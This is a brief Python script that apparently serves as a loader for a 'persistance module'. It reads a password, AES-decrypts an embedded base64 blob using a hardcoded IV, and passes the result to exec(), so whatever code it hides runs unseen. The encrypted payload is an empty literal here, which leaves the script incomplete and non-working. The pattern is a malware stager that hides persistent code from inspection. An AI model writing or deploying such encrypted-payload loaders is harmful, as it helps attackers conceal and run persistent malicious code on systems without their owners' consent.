from Crypto.Cipher import AES
import sys
import base64

print("\nEnter password to decrypt and run the persistance module\n")
decrypt = AES.new(sys.stdin.readline().replace("\n", ''), AES.MODE_CBC, "This is an IV456")
ss = decrypt.decrypt(base64.b64decode(b''))
exec(base64.b64decode(ss))

print("Message Decoded!")